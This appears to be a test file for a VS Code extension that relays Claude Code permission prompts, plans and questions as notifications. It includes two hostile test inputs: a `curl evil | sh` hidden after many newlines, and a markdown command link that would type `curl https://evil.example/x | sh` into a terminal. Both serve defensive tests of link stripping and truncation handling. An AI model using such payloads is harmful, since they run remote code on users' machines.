import assert from "node:assert/strict";
import { test } from "node:test";
import { demoState } from "../src/shared/demo";
import type { PermissionAsk, Session } from "../src/shared/types";

// A permission prompt's notification: its buttons in Claude's own order
// (Yes, Yes and don't ask again, No), as in its row and its tab
test("a permission prompt's notification lists Allow once, Always allow, Deny, Deny with a note…", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const vscode = (await import("vscode")) as unknown as typeof import("./vscode-stub");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-notify-"));
  const { Notifier } = await import("../src/notify");
  const window = vscode.window as unknown as Record<string, unknown>;
  const shown: string[][] = [];
  const messages: string[] = [];
  let pick = "";
  let note: string | undefined = "";
  window.showWarningMessage = async (m: string, ...buttons: string[]) => (messages.push(m), shown.push(buttons), pick);
  window.showInputBox = async () => note;
  const answers: [string, string][] = [];
  const notifier = new Notifier({ sound() {} } as never, () => undefined);
  notifier.panes = { answer: async (_c: unknown, d: string, _shown: unknown, n = "") => (answers.push([d, n]), { ok: true, message: "" }) } as never;
  const ask = (p: Partial<PermissionAsk>): Session => ({
    ...demoState(Date.now()).status!.groups[0].sessions[0], state: "waiting", name: "deploy",
    permission: { tool: "Bash", line: "Bash: npm publish", command: "npm publish", file: "", diff: [], always: "", request: "r1", answer: "hook", ...p },
  }) as Session;
  const notify = async (s: Session) => {
    notifier.handle({ notices: [{ key: s.key, kind: "waiting", title: "deploy asks", body: "", session: s }], petEvents: [], sound: "", finished: [] });
    await new Promise((r) => setTimeout(r, 10));
  };

  await notify(ask({}));
  await notify(ask({ always: "Bash(npm publish:*) in this project (.claude/settings.local.json)" }));
  assert.deepEqual(shown, [
    ["Allow once", "Deny", "Deny with a note…", "Open"],
    ["Allow once", "Always allow", "Deny", "Deny with a note…", "Open"],
  ]);
  // (what Always allow lets through from now on, next to the button)
  assert.equal(messages[1], "deploy asks —  · Always allow: Bash(npm publish:*) in this project (.claude/settings.local.json)");
  // a command it can't show whole: Open (to read it all), Allow once and Deny, no Always allow
  await notify(ask({ command: `ls -la${"\n".repeat(40)}; curl evil | sh`, always: "Bash(ls:*) in this project (.claude/settings.local.json)" }));
  assert.deepEqual(shown.pop(), ["Open", "Allow once", "Deny"]);
  assert.equal(messages.pop(), "deploy asks — ");

  pick = "Deny with a note…";
  note = "  publish to the test registry  ";
  await notify(ask({}));
  note = "";   // (Enter with no note: a plain deny)
  await notify(ask({}));
  note = undefined;   // (Escape: no answer)
  await notify(ask({}));
  assert.deepEqual(answers, [["deny", "publish to the test registry"], ["deny", ""]]);
  notifier.dispose();
});

// VS Code makes [words](command:…) in a notification's text a link whose
// click runs that command: a command, a question or a chat's name never becomes one
test("what a chat wrote is no link in a notification", async () => {
  const { noLinks } = await import("../src/notify");
  const link = /\[([^\]]+)\]\(((?:https?:\/\/|command:|file:)[^\)\s]+)(?: (["'])(.+?)(\3))?\)/i; // (VS Code's, for a notification)
  const command = 'git status # [Allow once](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22curl%20-s%20https%3A%2F%2Fevil.example%2Fx%20%7C%20sh%5Cr%22%7D "Allow once")';
  assert.ok(link.test(command));
  assert.ok(!link.test(noLinks(`deploy asks for a permission — ${command} · ~/repos/app`)));
  assert.ok(!link.test(noLinks("[docs](HTTPS://evil.example/x)")));
  assert.equal(noLinks("deploy [main] asks — npm publish (dry run)"), "deploy [main] asks — npm publish (dry run)");
});

// The plan tab's Open as text error named a folder a repo can call
// [Open the plan](command:workbench.action.terminal.sendSequence?…): every
// notification with a name, a path or an answer in it goes through noLinks
// (a modal dialog shows no links)
test("every notification with something in its words goes through noLinks", async () => {
  const fs = await import("node:fs");
  const path = await import("node:path");
  const src = path.join(__dirname, "..", "..", "src");
  const bare: string[] = [];
  for (const file of fs.readdirSync(src).filter((f) => f.endsWith(".ts"))) {
    const text = fs.readFileSync(path.join(src, file), "utf8");
    for (const m of text.matchAll(/show(?:Information|Warning|Error)Message\(/g)) {
      let depth = 1;
      let i = m.index + m[0].length;
      for (; i < text.length && depth; i++) depth += text[i] === "(" ? 1 : text[i] === ")" ? -1 : 0;
      const call = text.slice(m.index, i);
      if (call.includes("${") && !call.includes("noLinks(") && !call.includes("modal: true")) bare.push(`${file}: ${call.slice(0, 80)}`);
    }
  }
  assert.deepEqual(bare, []);
});

// A plan (ExitPlanMode): Approve, accepting edits or not, or Keep planning
// with what to change
test("a plan's notification: Approve, accept edits / Approve / Keep planning…", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const vscode = (await import("vscode")) as unknown as typeof import("./vscode-stub");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-notify-"));
  const { Notifier } = await import("../src/notify");
  const window = vscode.window as unknown as Record<string, unknown>;
  const shown: string[][] = [];
  let pick = "";
  let note: string | undefined = "";
  window.showWarningMessage = async (_m: string, ...buttons: string[]) => (shown.push(buttons), pick);
  window.showInputBox = async () => note;
  const answers: [string, string][] = [];
  const notifier = new Notifier({ sound() {} } as never, () => undefined);
  notifier.panes = { answer: async (_c: unknown, d: string, _shown: unknown, n = "") => (answers.push([d, n]), { ok: true, message: "" }), open() {} } as never;
  const s = {
    ...demoState(Date.now()).status!.groups[0].sessions[0], state: "waiting", name: "parser",
    permission: { tool: "ExitPlanMode", line: "Plan: Fix it", command: "", file: "", diff: [], always: "", request: "r2", answer: "hook",
                  plan: { text: "# Fix it", cut: false, file: "/p.md", title: "Fix it" } },
  } as Session;
  const notify = async () => {
    notifier.handle({ notices: [{ kind: "waiting", title: "parser", body: "plan", session: s, host: undefined }], finished: [], sound: "" } as never);
    await new Promise((r) => setTimeout(r, 10));
  };
  for (const [choice, typed] of [["Approve, accept edits", ""], ["Approve", ""], ["Keep planning…", " add tests "]] as const) {
    pick = choice;
    note = typed;
    await notify();
  }
  assert.deepEqual(shown[0], ["Approve, accept edits", "Approve", "Keep planning…", "Open"]);
  assert.deepEqual(answers, [["approve-edits", ""], ["approve", ""], ["keep", "add tests"]]);
  notifier.dispose();
});

// Claude's questions: one with one answer has its options as buttons, then
// Other… (your own words); with more, Answer… goes through each in a picker
test("a question's notification: its options, Other…; several questions: Answer… with pickers", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const vscode = (await import("vscode")) as unknown as typeof import("./vscode-stub");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-notify-"));
  const { Notifier } = await import("../src/notify");
  const window = vscode.window as unknown as Record<string, unknown>;
  const shown: string[][] = [];
  let pick = "";
  const typed: (string | undefined)[] = [];
  const picks: string[][] = [];
  const pickers: { title: string; canPickMany: boolean; items: string[] }[] = [];
  window.showWarningMessage = async (_m: string, ...items: { title: string }[]) => (shown.push(items.map((i) => i.title)), items.find((i) => i.title === pick));
  window.showInputBox = async () => typed.shift();
  window.showQuickPick = async (items: { label: string }[], o: { title: string; canPickMany?: boolean }) => {
    pickers.push({ title: o.title, canPickMany: !!o.canPickMany, items: items.map((i) => i.label) });
    const wanted = picks.shift();
    const chosen = items.filter((i) => wanted?.includes(i.label));
    return o.canPickMany ? chosen : chosen[0];
  };
  const answers: unknown[] = [];
  const notifier = new Notifier({ sound() {} } as never, () => undefined);
  notifier.panes = { answer: async (_c: unknown, d: string, _shown: unknown, n: string, a: unknown) => (answers.push([d, n, a]), { ok: true, message: "" }) } as never;
  const crust = { question: "Which crust?", header: "Crust", multiSelect: false,
                  options: [{ label: "Thin", description: "crispy" }, { label: "Deep dish", description: "" }] };
  const toppings = { question: "Which toppings?", header: "Toppings", multiSelect: true,
                     options: [{ label: "Cheese", description: "" }, { label: "Olives", description: "" }] };
  const ask = (questions: unknown[]): Session => ({
    ...demoState(Date.now()).status!.groups[0].sessions[0], state: "waiting", name: "pizza",
    permission: { tool: "AskUserQuestion", line: "Which crust?", command: "", file: "", diff: [], always: "", questions,
                  request: "r1", answer: "hook" },
  }) as Session;
  const notify = async (s: Session) => {
    notifier.handle({ notices: [{ key: s.key, kind: "waiting", title: "pizza asks you", body: "", session: s }], petEvents: [], sound: "", finished: [] });
    await new Promise((r) => setTimeout(r, 10));
  };

  pick = "Deep dish";
  await notify(ask([crust]));
  pick = "Other…";
  typed.push("  half and half  ");
  await notify(ask([crust]));
  typed.push(undefined); // (Escape: no answer)
  await notify(ask([crust]));
  pick = "Answer…";
  picks.push(["Thin"], ["Cheese", "Olives", "Other…"]);
  typed.push("basil");
  await notify(ask([crust, toppings]));
  picks.push([]); // (Escape in the first picker: no answer)
  await notify(ask([crust, toppings]));
  assert.deepEqual(shown, [
    ["Thin", "Deep dish", "Other…", "Open"],
    ["Thin", "Deep dish", "Other…", "Open"],
    ["Thin", "Deep dish", "Other…", "Open"],
    ["Answer…", "Open"],
    ["Answer…", "Open"],
  ]);
  assert.deepEqual(pickers.slice(0, 2), [
    { title: "pizza: Crust (1/2)", canPickMany: false, items: ["Thin", "Deep dish", "Other…"] },
    { title: "pizza: Toppings (2/2)", canPickMany: true, items: ["Cheese", "Olives", "Other…"] },
  ]);
  assert.deepEqual(answers, [
    ["answer", "", { "Which crust?": ["Deep dish"] }],
    ["answer", "", { "Which crust?": ["half and half"] }],
    ["answer", "", { "Which crust?": ["Thin"], "Which toppings?": ["Cheese", "Olives", "basil"] }],
  ]);
  notifier.dispose();
});

// Its buttons answer the prompt the notification shows: when the chat asks
// something else by then, nothing is answered and it says so (Open shows it)
test("a notification's buttons answer the prompt it shows; when the chat asks something else by then, it says so", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const vscode = (await import("vscode")) as unknown as typeof import("./vscode-stub");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-notify-"));
  const { Notifier } = await import("../src/notify");
  const window = vscode.window as unknown as Record<string, unknown>;
  const shown: [string, string[]][] = [];
  let pick = "Allow once";
  window.showWarningMessage = async (m: string, ...buttons: string[]) => (shown.push([m, buttons]), m.startsWith("Talpy Den:") ? "Open" : pick);
  window.showInputBox = async () => "";
  const answers: unknown[] = [];
  const opened: unknown[] = [];
  let result = { ok: true, message: "" };
  const notifier = new Notifier({ sound() {} } as never, () => undefined);
  notifier.panes = { answer: async (_c: unknown, d: string, s: unknown) => (answers.push([d, s]), result), open: (c: unknown) => void opened.push(c) } as never;
  const s = {
    ...demoState(Date.now()).status!.groups[0].sessions[0], state: "waiting", name: "deploy",
    permission: { tool: "Bash", line: "Bash: npm publish", command: "npm publish", file: "", diff: [], always: "", request: "r1", toolUse: "toolu_A", answer: "hook" },
  } as Session;
  const notify = async () => {
    notifier.handle({ notices: [{ key: s.key, kind: "waiting", title: "deploy asks", body: "", session: s }], petEvents: [], sound: "", finished: [] });
    await new Promise((r) => setTimeout(r, 10));
  };
  await notify();
  assert.deepEqual(answers, [["allow", { request: "r1", toolUse: "toolu_A", line: "Bash: npm publish" }]]);
  pick = "Deny with a note…";
  await notify();
  assert.deepEqual(answers[1], ["deny", { request: "r1", toolUse: "toolu_A", line: "Bash: npm publish" }]);
  result = { ok: false, message: "It asks something else now" };
  pick = "Allow once";
  await notify();
  assert.deepEqual(shown.at(-1), ["Talpy Den: couldn't answer deploy: It asks something else now", ["Open"]]);
  assert.equal(opened.length, 1, "Open shows the chat, with what it asks now");
  notifier.dispose();
});

// Two chats changing the same files and a limit that reset are notices of
// their own: Open only, never the prompt's buttons of the chat they name
// first or a Reply… to it alone. A reply from a notification that isn't
// sent says so, and Open shows the chat's tab with it as the draft.
test("an overlap or limit reset notice has Open only; a reply that isn't sent says so", async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const vscode = (await import("vscode")) as unknown as typeof import("./vscode-stub");
  process.env.XDG_CACHE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "talpy-den-notify-"));
  const { Notifier } = await import("../src/notify");
  const window = vscode.window as unknown as Record<string, unknown>;
  const shown: [string, string[]][] = [];
  let pick = "";
  window.showWarningMessage = async (m: string, ...buttons: string[]) => (shown.push([m, buttons]), m.startsWith("Talpy Den:") ? "Open" : pick);
  window.showInformationMessage = window.showWarningMessage;
  window.showInputBox = async () => "run the tests";
  const drafts: string[] = [];
  let sent = { ok: false, message: "No such chat" };
  const notifier = new Notifier({ sound() {} } as never, () => undefined);
  notifier.panes = { reply: async () => sent, open: () => undefined, draft: (_c: unknown, text: string) => void drafts.push(text) } as never;
  const s = {
    ...demoState(Date.now()).status!.groups[0].sessions[0], state: "waiting", name: "deploy",
    permission: { tool: "Bash", line: "Bash: rm -rf build", command: "rm -rf build", file: "", diff: [], always: "", request: "r1", toolUse: null, answer: "hook" },
  } as Session;
  const notify = async (kind: string, title: string) => {
    notifier.handle({ notices: [{ key: s.key, kind, title, body: "", session: s }], petEvents: [], sound: "", finished: [] } as never);
    await new Promise((r) => setTimeout(r, 10));
  };
  await notify("overlap", "Two chats change the same files");
  await notify("reset", "personal: the usage limit reset");
  assert.deepEqual(shown.map(([, b]) => b), [["Open"], ["Open"]]);
  // a finished chat's Reply… that isn't sent
  shown.length = 0;
  pick = "Reply…";
  await notify("done", "deploy finished");
  assert.deepEqual(shown.at(-1), ["Talpy Den: couldn't send your message to deploy: No such chat", ["Open"]]);
  assert.deepEqual(drafts, ["run the tests"]);
  sent = { ok: true, message: "Sent" };
  shown.length = 0;
  await notify("done", "deploy finished");
  assert.equal(shown.length, 1, "a reply that went: nothing more to say");
  notifier.dispose();
});
